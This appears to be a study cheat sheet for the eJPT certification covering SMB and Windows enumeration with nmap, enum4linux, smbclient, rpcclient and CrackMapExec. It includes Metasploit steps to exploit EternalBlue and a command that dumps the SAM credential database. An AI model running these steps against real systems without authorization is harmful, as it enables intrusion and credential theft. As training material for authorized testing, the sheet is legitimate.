# SMB & Windows Enumeration Cheat Sheet

One of the most heavily used parts of eJPT's host/network enumeration module: gathering share, user, group, and patch-level information about a target Windows machine via the SMB (Server Message Block) service.

---

## Table of Contents

1. [What SMB Is & Why It Matters](#1-what-smb-is--why-it-matters)
2. [Port & Service Discovery](#2-port--service-discovery)
3. [enum4linux](#3-enum4linux)
4. [smbclient](#4-smbclient)
5. [rpcclient](#5-rpcclient)
6. [Nmap NSE SMB Scripts](#6-nmap-nse-smb-scripts)
7. [SMB Vulnerabilities (EternalBlue, etc.)](#7-smb-vulnerabilities-eternalblue-etc)
8. [SMB with CrackMapExec](#8-smb-with-crackmapexec)
9. [Quick Command Reference](#9-quick-command-reference)

---

## 1. What SMB Is & Why It Matters

SMB is the protocol used in Windows environments for file/printer sharing and inter-process communication (IPC) (port 445, or the older NetBIOS transport on 139). When misconfigured:

- A **null session** can pull user/share lists without any authentication.
- **Anonymous/guest-accessible shares** may hold sensitive files (scripts, credentials, backups).
- **Older SMB versions** (SMBv1) can be vulnerable to critical remote code execution flaws like EternalBlue.

---

## 2. Port & Service Discovery

```bash
nmap -p 139,445 -sV target-ip
nmap -p 139,445 --script smb-os-discovery target-ip
```

If SMB is open, the very first scan typically returns the OS version, hostname, and domain/workgroup info — everything downstream builds on this.

---

## 3. enum4linux

The fastest, most comprehensive first-pass SMB enumeration tool via null session.

```bash
enum4linux -a target-ip          # Run all modules (comprehensive but noisy)
enum4linux -U target-ip          # Users list only
enum4linux -S target-ip          # Shares list only
enum4linux -P target-ip          # Password policy

# Newer, faster alternative
enum4linux-ng -A target-ip -oY output
```

What to look for: user list, group memberships, OS info, password policy (lockout threshold — critical for password spraying), shared folders.

---

## 4. smbclient

For connecting directly to shares and browsing their contents.

```bash
smbclient -L //target-ip -N              # Share list via null session
smbclient -L //target-ip -U username     # Authenticated share list

smbclient //target-ip/SHARENAME -N       # Connect to a share (null session)
smb: \> ls
smb: \> get file.txt                     # Download a file
smb: \> put localfile.txt                # Upload a file (if write access exists)
```

> **Common find:** Share names like `Users`, `Backup`, `IT`, `Scripts` often contain hardcoded credentials or SSH/RDP secrets inside scripts — always check the actual content.

---

## 5. rpcclient

Deeper enumeration over MSRPC; sometimes works even under a null session.

```bash
rpcclient -U "" -N target-ip     # Null session connection
rpcclient -U "user%password" target-ip

rpcclient $> enumdomusers        # Domain user list
rpcclient $> enumdomgroups       # Domain group list
rpcclient $> querydominfo        # General domain info (includes password policy)
rpcclient $> queryuser 0x3e8     # User detail for a given RID
rpcclient $> lsaquery            # SID/domain name lookup
```

---

## 6. Nmap NSE SMB Scripts

```bash
nmap -p 445 --script smb-enum-shares target-ip
nmap -p 445 --script smb-enum-users target-ip
nmap -p 445 --script smb-os-discovery target-ip
nmap -p 445 --script smb-vuln-* target-ip        # Bulk scan for known SMB vulnerabilities
nmap -p 445 --script smb-protocols target-ip     # Supported SMB versions (is SMBv1 enabled?)
```

---

## 7. SMB Vulnerabilities (EternalBlue, etc.)

| Vulnerability | CVE | Note |
|---|---|---|
| **EternalBlue** | CVE-2017-0144 | RCE in SMBv1 — Metasploit `exploit/windows/smb/ms17_010_eternalblue` |
| **SMBGhost** | CVE-2020-0796 | RCE in SMBv3 compression |
| **Null session misconfig** | — | Not a CVE, but the most common "easy way in" scenario |

```bash
# Scan for MS17-010 (EternalBlue)
nmap -p 445 --script smb-vuln-ms17-010 target-ip

# Verify/exploit with Metasploit
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target-ip
run
```

---

## 8. SMB with CrackMapExec

CrackMapExec combines SMB enumeration with credential testing in a single tool (you have a separate `crackmapexec-cheatsheet-professional.md` — this just summarizes the SMB-specific shortcuts):

```bash
crackmapexec smb target-ip                          # OS/hostname/SMB version detection
crackmapexec smb target-ip -u '' -p '' --shares      # Share list via null session
crackmapexec smb target-ip -u user -p pass --shares  # Authenticated share + permission list
crackmapexec smb target-ip -u user -p pass --sam     # Dump the SAM database (requires high privilege)
```

---

## 9. Quick Command Reference

| Need | Command |
|---|---|
| Comprehensive null-session enum | `enum4linux -a target-ip` |
| Share list (null) | `smbclient -L //target-ip -N` |
| Connect to a share | `smbclient //target-ip/SHARE -N` |
| User list via RPC | `rpcclient -U "" -N target-ip -c enumdomusers` |
| OS/SMB version detection | `nmap -p 445 --script smb-os-discovery target-ip` |
| MS17-010 scan | `nmap -p 445 --script smb-vuln-ms17-010 target-ip` |
| Shares + permissions (with creds) | `crackmapexec smb target-ip -u user -p pass --shares` |

---

*Prepared as a reference for the eJPT host/network enumeration module. All techniques should only be used within written authorization (scope/RoE).*
